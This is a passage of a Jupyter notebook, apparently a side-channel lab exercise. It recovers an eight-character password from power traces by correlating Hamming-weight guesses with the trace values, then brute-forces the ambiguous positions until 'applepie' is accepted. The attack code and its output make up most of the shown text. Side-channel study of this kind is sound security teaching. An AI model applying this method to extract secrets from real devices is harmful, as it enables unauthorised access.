"id\":\"1043\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1080\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"source\":{\"id\":\"1048\"}},\"id\":\"1053\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1010\",\"type\":\"LinearScale\"},{\"attributes\":{\"source\":{\"id\":\"1054\"}},\"id\":\"1059\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1081\",\"type\":\"Selection\"}],\"root_ids\":[\"1003\"]},\"title\":\"Bokeh Application\",\"version\":\"2.4.1\"}};\n  const render_items = [{\"docid\":\"a709b2fb-4ac4-4d15-ac00-03d2ba414f12\",\"root_ids\":[\"1003\"],\"roots\":{\"1003\":\"65241bde-e384-4d73-b40a-fed440af0335\"}}];\n  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1003"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "### Switched to Markdown\n",
    "p = figure(width=900, height=400)\n",
    "p.add_tools(CrosshairTool())\n",
    "\n",
    "for i in range(5):\n",
    "    p.line(\n",
    "        range(len(traces[i][0])), \n",
    "        traces[i][0], \n",
    "        line_color=Category10_10[i],\n",
    "    )\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def calculate_correlation(gues, gues_pos, attempts, traces, trace_pos):\n",
    "    x = [hw(gues ^ attempts[i][gues_pos]) for i in range(trace_nums)]\n",
    "    y = [traces[i][0][trace_pos] for i in range(trace_nums)]\n",
    "    return person_correlation(x,y)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_max_value_pos_with_gues(guess, guess_pos, traces):\n",
    "    cor_values = []\n",
    "    for i in range(420):\n",
    "        cor_values.append(abs(calculate_correlation(guess, guess_pos,attempts, traces, i)))\n",
    "\n",
    "    max_value = max(cor_values)\n",
    "    max_value_pos = cor_values.index(max_value)\n",
    "    return max_value, max_value_pos\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(0.6706951101126043, 70)\n"
     ]
    }
   ],
   "source": [
    "print(get_max_value_pos_with_gues(ord('i'), 0, traces))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_max_char_from_pos(gues_pos, traces):\n",
    "    chars = list(\"abcdefghijklmnopqrstuvwxyz\")\n",
    "\n",
    "    max_value_per_guess_char = []\n",
    "\n",
    "    for char in chars:\n",
    "        max_value, max_pos = get_max_value_pos_with_gues(ord(char), gues_pos, traces)\n",
    "        max_value_per_guess_char.append((char, max_value, max_pos))\n",
    "\n",
    "    return sorted(max_value_per_guess_char, key=lambda item: item[1], reverse = True)\n",
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('a', 0.8743589437748555, 70), ('c', 0.7373401328323627, 70), ('i', 0.6706951101126043, 70), ('b', 0.6211538230346458, 70), ('q', 0.6139983370645564, 70), ('e', 0.6117004921711597, 70), ('p', 0.586682732955003, 121), ('h', 0.5664486087273161, 53), ('k', 0.5256126881480847, 70), ('j', 0.5123758692609609, 53), ('d', 0.5083265677098115, 71), ('x', 0.4860150218702879, 121), ('t', 0.48118544001405206, 121), ('s', 0.4785065662906659, 70), ('g', 0.47542299920445613, 70), ('w', 0.4477096378894403, 45), ('f', 0.43697721036452214, 56), ('l', 0.4318793618377758, 53), ('o', 0.42520988156408585, 43), ('r', 0.4209878508598204, 121), ('y', 0.4027952521395289, 70), ('m', 0.40205338569210336, 70), ('n', 0.388165137114116, 55), ('u', 0.3584214821430835, 70), ('z', 0.345636323579258, 56), ('v', 0.310842664736694, 121)]\n"
     ]
    }
   ],
   "source": [
    "print(get_max_char_from_pos(0, traces))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('a', 0.8743589437748555, 70), ('c', 0.7373401328323627, 70), ('i', 0.6706951101126043, 70)]\n",
      "[('p', 0.8364073252460741, 110), ('q', 0.8152360531393119, 113), ('a', 0.7426422072994087, 113)]\n",
      "[('p', 0.9076312502735139, 153), ('q', 0.7237318034202999, 153), ('t', 0.6602777276175108, 153)]\n",
      "[('l', 0.8461067127435217, 190), ('x', 0.7371784800422861, 193), ('h', 0.7342966971918025, 193)]\n",
      "[('l', 0.8570718877717052, 234), ('e', 0.84889519774639, 230), ('m', 0.8309298095467855, 233)]\n",
      "[('p', 0.829341503309146, 270), ('u', 0.7719202700393553, 273), ('t', 0.7543857359721465, 273)]\n",
      "[('p', 0.8501007772081981, 314), ('i', 0.8246871372855722, 310), ('q', 0.7956559733116297, 313)]\n",
      "[('e', 0.764611419222818, 413), ('d', 0.6363585305607058, 413), ('m', 0.6210757823812101, 417)]\n"
     ]
    }
   ],
   "source": [
    "### Switched to Markdown\n",
    "for i in range(8):\n",
    "    list_of_char = get_max_char_from_pos(i, traces)\n",
    "    \n",
    "    print(list(list_of_char[:3]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('a', 0.8743589437748555, 70)\n",
      "('p', 0.8364073252460741, 110)('q', 0.8152360531393119, 113)\n",
      "('p', 0.9076312502735139, 153)\n",
      "('l', 0.8461067127435217, 190)\n",
      "('l', 0.8570718877717052, 234)('e', 0.84889519774639, 230)\n",
      "('p', 0.829341503309146, 270)('u', 0.7719202700393553, 273)\n",
      "('p', 0.8501007772081981, 314)('i', 0.8246871372855722, 310)\n",
      "('e', 0.764611419222818, 413)\n"
     ]
    }
   ],
   "source": [
    "# Prints values which are with low distance\n",
    "distance = 0.1\n",
    "\n",
    "for i in range(8):\n",
    "    list_of_char = get_max_char_from_pos(i, traces)\n",
    "    print(list_of_char[0], end='')\n",
    "    for a in range(1):\n",
    "        if abs(list_of_char[a][1] - list_of_char[a + 1][1]) > distance:\n",
    "            break\n",
    "        print(list_of_char[1], end='')\n",
    "    print('')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a1pl456e\n",
      "{'1': ['p', 'q'], '4': ['l', 'e'], '5': ['p', 'u'], '6': ['p', 'i']}\n"
     ]
    }
   ],
   "source": [
    "# Store values with less distance for later try-out\n",
    "\n",
    "test_str = \"\"\n",
    "test_dict = {}\n",
    "\n",
    "\n",
    "for i in range(8):\n",
    "    list_of_char = get_max_char_from_pos(i, traces)\n",
    "    \n",
    "    if abs(list_of_char[0][1] - list_of_char[1][1]) > 0.06:  # 0.08\n",
    "        test_str += list_of_char[0][0]\n",
    "    else:\n",
    "        test_str += ascii(i)\n",
    "        test_dict[ascii(i)] = [list_of_char[0][0], list_of_char[1][0]]\n",
    "\n",
    "print(test_str)\n",
    "print(test_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "All combinations : ['appllppe', 'appllpie', 'appllupe', 'applluie', 'appleppe', 'applepie', 'appleupe', 'appleuie', 'aqpllppe', 'aqpllpie', 'aqpllupe', 'aqplluie', 'aqpleppe', 'aqplepie', 'aqpleupe', 'aqpleuie']\n"
     ]
    }
   ],
   "source": [
    "# Calculate all combinations\n",
    "from itertools import product\n",
    "\n",
    "res = []\n",
    "  \n",
    "# constructing all possible combination of values using product\n",
    "# mapping using zip()\n",
    "for sub in [zip(test_dict.keys(), chr) for chr in product(*test_dict.values())]:\n",
    "    temp = test_str\n",
    "    for repls in sub:\n",
    "        # replacing all elements at once using * operator\n",
    "        temp = temp.replace(*repls)\n",
    "    res.append(temp)\n",
    "  \n",
    "# printing result \n",
    "print(\"All combinations : \" + str(res)) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Successfull : applepie\n"
     ]
    }
   ],
   "source": [
    "# Try all combinations\n",
    "for attempt in res:\n",
    "    _, password_pass = capture(attempt, count=1)\n",
    "    if password_pass == True:\n",
    "        print(\"Successfull : {}\".format(attempt))\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "e6a9ff99e7f48ddc354d1453a75f191a2a3408f9572c79e6e746e872f3f5130d"
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.12"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "268.667px"
   },
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
